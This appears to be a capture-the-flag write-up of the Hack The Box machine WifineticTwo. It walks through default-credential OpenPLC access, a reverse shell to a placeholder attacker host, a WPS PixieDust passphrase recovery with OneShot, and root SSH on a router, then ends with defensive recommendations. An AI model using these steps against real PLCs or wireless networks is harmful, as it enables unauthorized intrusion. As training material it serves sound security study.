---
title: "WifineticTwo — OpenPLC RCE and WPS PixieDust Pivot"
description: "Default OpenPLC credentials and a Structured Text C extension provide container root; wireless scanning and a WPS PixieDust attack recover a WPA passphrase, and association leads to passwordless root SSH on a router."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - ics
  - wifi
  - wps
  - openplc
objective: "Move from a default-credential OpenPLC runtime to container root, then pivot across the wireless segment with WPS credential recovery to the adjacent router."
tools:
  - nmap
  - netcat
  - OpenPLC
  - iw
  - OneShot
  - wpa_supplicant
  - dhclient
  - ssh
skill: "ICS application abuse and wireless (WPS) credential recovery leading to network-device access"
outcome: "Root code execution in the PLC container, WPA2 credential recovery via WPS PixieDust, and passwordless root SSH on the adjacent router"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux OpenPLC runtime container with a wireless interface, plus an adjacent wireless router |
| Starting position | Unauthenticated network access |
| Objective | Move from a default-credential OpenPLC runtime to container root, then pivot across the wireless segment with WPS credential recovery to the adjacent router |
| Outcome | Root execution in the PLC container; WPA2 credential recovery and association with the wireless AP; passwordless root SSH on the router |

## OpenPLC extension to PixieDust router root

WifineticTwo is a Medium Linux Hack The Box lab that combines industrial-control application abuse with a wireless pivot. An OpenPLC runtime reachable with its default credentials accepts an uploaded Structured Text program, compiles and executes its C extension, and produces a root shell inside a container that carries a wireless interface. A WPS PixieDust attack against a nearby access point recovers the WPA2 passphrase, and association with that network exposes a router whose SSH service accepts a passwordless root login. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The reverse-shell payload is shown as a placeholder pattern only.

**Attack path:** **Default-credential OpenPLC runtime → Structured Text C-extension execution → container root → wireless AP discovery → WPS PixieDust credential recovery → WPA2 association → passwordless root SSH on the router**

## OpenPLC container with wireless, ICS interface to router

- **Target:** Linux host exposing SSH (22) and a web-facing OpenPLC runtime (8080).
- **Starting position:** unauthenticated network access, no provided credentials.
- **Objective:** assess the path from the exposed industrial-control interface to the adjacent wireless segment and the router.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: OpenPLC extension, PixieDust, and router SSH

### Service enumeration

Observation: a full TCP scan exposes SSH and an HTTP proxy service.

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/wifinetictwo <TARGET_IP>
```

```text
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu
8080/tcp open  http-proxy   HAProxy / Werkzeug 1.0.1 Python/2.7.18
```

Significance: port 8080 is the OpenPLC runtime web interface, the application surface evaluated next.

Result: the scan identifies SSH and the OpenPLC web interface on the target.

### OpenPLC program execution

Observation: the OpenPLC runtime is reachable with its default credentials, and its Structured Text format supports C extensions through custom output functions. I tried the default credentials and they granted access to the runtime.

Action: I uploaded a Structured Text program containing a C extension through **Programs → Upload Program**, then compiled and started it through **Dashboard → Start PLC**. The payload is shown as a placeholder pattern only.

```text
<ST_PROGRAM_WITH_C_EXTENSION>   # reverse shell to <ATTACKER_HOST>:<LISTEN_PORT>
```

```bash
nc -lvnp <LISTEN_PORT>
```

```text
root@<CONTAINER_HOST>:~#
```

Significance: compiling and running an extension in a privileged runtime turns application-level program upload into operating-system command execution.

Result: the listener returns a root shell inside the container.

### Wireless interface discovery

Observation: the container exposes a managed wireless interface, and scanning finds a nearby access point with WPS enabled.

Action: I inspected the interface and nearby wireless capabilities.

```bash
iw dev
iw dev <WIRELESS_INTERFACE> scan | grep -E "^BSS|SSID|WPS"
```

```text
Interface <WIRELESS_INTERFACE>
  type managed
BSS <AP_MAC_ADDRESS>
SSID: <WIRELESS_SSID>
WPS: ...
```

Significance: WPS availability creates a separate authentication path to the adjacent wireless network.

Result: a WPS-enabled access point is discoverable from the container.

### WPS credential recovery

Observation: the discovered access point exposes WPS.

Action: a PixieDust-capable WPS tool was run against the access point.

```bash
python3 oneshot.py -b <AP_MAC_ADDRESS> -i <WIRELESS_INTERFACE> -K
```

```text
[+] WPS PIN: '<WPS_PIN>'
[+] WPA PSK: '<WPA2_PASSPHRASE>'
[+] AP SSID: '<WIRELESS_SSID>'
```

Significance: PixieDust targets access points that use predictable WPS E-S1/E-S2 nonces, so WPA2 passphrase recovery is near-instant where the implementation is vulnerable.

Result: a WPS PIN and the WPA2 passphrase are recovered.

### Wireless association

Observation: the recovered WPA2 passphrase allows association with the wireless network and a DHCP lease.

Action: I created a supplicant configuration, associated the container with the access point, and requested a lease.

```bash
wpa_supplicant -B -i <WIRELESS_INTERFACE> -c <WPA_CONFIG>
dhclient <WIRELESS_INTERFACE>
ip addr show <WIRELESS_INTERFACE>
```

```text
inet <DHCP_LEASE>
```

Significance: association crosses the container boundary onto the wireless segment, which puts the adjacent network in reach.

Result: the interface receives a DHCP lease on the wireless network.

### Router access

Observation: the wireless network exposes a reachable gateway, and SSH is one of its open services.

Action: I identified the gateway by ARP, confirmed its services, and attempted SSH with the root account.

```bash
arp -a
nmap <ROUTER_GATEWAY>
ssh <ROUTER_ROOT_ACCOUNT>@<ROUTER_GATEWAY>
```

```text
? (<ROUTER_GATEWAY>) at <AP_MAC_ADDRESS>
22/tcp  open  ssh
root@<ROUTER_ROOT_PROMPT>:~#
```

Significance: the gateway accepts a root SSH login without a password, so reaching the wireless segment is enough to obtain administrative control of the router without any credential.

Result: an unauthenticated root shell is obtained on the router.

## Challenges and Decisions

- The source documents no failed attempts or alternative paths.
- **WPS PixieDust.** Predictable WPS E-S1/E-S2 nonces allow near-instant recovery of the WPA2 passphrase, in contrast to online WPS PIN brute force.

## Outcome: container root, WPA2 recovery, and router root SSH

The documented results show root code execution inside the OpenPLC container, recovery of the WPA2 wireless credential through a WPS PixieDust attack, and a passwordless root SSH session on the adjacent router. The reverse-shell payload was not reproduced here, and no step beyond the lab was validated.

## Recommendations: default ICS credentials, WPS, and passwordless root SSH

The exercise demonstrated these weaknesses, but it did not test the controls recommended below.

1. **Default ICS credentials.** The OpenPLC runtime accepted its default credentials and compiled an uploaded program that ran with root privileges. *Recommendation:* remove default credentials on every ICS/OT management interface and restrict runtime program-upload and execution privileges to authorized operators. *Detection:* raise alerts for logins with default or shared accounts and for program uploads to the PLC runtime.
2. **WPS enabled on the access point.** WPS exposed a second authentication path whose predictable nonces yielded the WPA2 passphrase. *Recommendation:* disable WPS on all access points and verify it is off (`iw dev <WIRELESS_INTERFACE> scan | grep WPS`). *Detection:* periodically scan for access points advertising WPS.
3. **Passwordless root SSH on the router.** The router accepted a root SSH login without a password, making network placement alone sufficient for administrative control. *Recommendation:* disable passwordless and default root logins, and require named accounts with key-based or strong password authentication. *Detection:* audit device configurations and authentication logs for root or blank-credential SSH logins.

## References

- [Hack The Box — WifineticTwo](https://app.hackthebox.com/machines/WifineticTwo) (retired machine)
- [OpenPLC project documentation](https://openplcproject.com/docs/) (runtime and program upload)
- [OneShot](https://github.com/kimocoder/OneShot) (WPS PixieDust tooling)
- [wpa_supplicant](https://w1.fi/wpa_supplicant/) (wireless supplicant used for association)
- [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw) (wireless interface and scan configuration)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
